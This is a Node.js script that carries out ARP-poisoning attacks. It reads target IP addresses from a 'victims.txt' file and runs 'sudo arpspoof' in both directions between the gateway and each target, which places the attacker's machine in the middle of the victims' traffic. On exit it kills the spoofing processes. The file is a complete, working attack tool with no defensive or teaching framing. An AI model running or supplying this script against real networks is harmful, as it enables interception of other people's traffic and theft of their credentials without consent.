const fs = require('fs');
const nrc = require('node-run-cmd');

const IFACE = process.argv[2];
const GATEWAY = process.argv[3];
let MYMAC;
const FILEPATH = './victims.txt';

class Attack {
  constructor() {
    this.packetInterval = 5000; // recommended every 10 sec
  }

  start() {
    if (!IFACE) {
      throw Error('include an interface');
    } else {
      require('getmac').getMac({ iface: IFACE }, (err, macAddress) => {
        if (err) throw err;
        MYMAC = macAddress;
      });
    }
    if (!GATEWAY) {
      throw Error('include a GATEWAY!');
    } else {
      this.targets = fs
        .readFileSync(FILEPATH)
        .toString()
        .split('\n')
        .filter(ip => ip !== '');
    }
    if (!this.targets.length) throw new Error('Gather(.sh) some victims!');

    this.stop();
    const commands = [];
    this.targets.forEach(target => {
      console.log('poisoning', `${IFACE} ${GATEWAY} ${target}`);
      commands.push(`sudo arpspoof -i ${IFACE} -t ${GATEWAY} ${target}`);
      commands.push(`sudo arpspoof -i ${IFACE} -t ${target} ${GATEWAY}`);
    });
    nrc.run(commands, { mode: 'parallel' });
  }

  stop() {
    nrc.run('sudo killall arpspoof');
  }
}

const attack = new Attack();
attack.start();

process.stdin.resume(); // so the program will not close instantly

function exitHandler() {
  attack.stop();
}

// do something when app is closing
process.on('exit', exitHandler);
process.on('SIGINT', exitHandler);
process.on('SIGUSR1', exitHandler);
process.on('SIGUSR2', exitHandler);
process.on('uncaughtException', exitHandler);
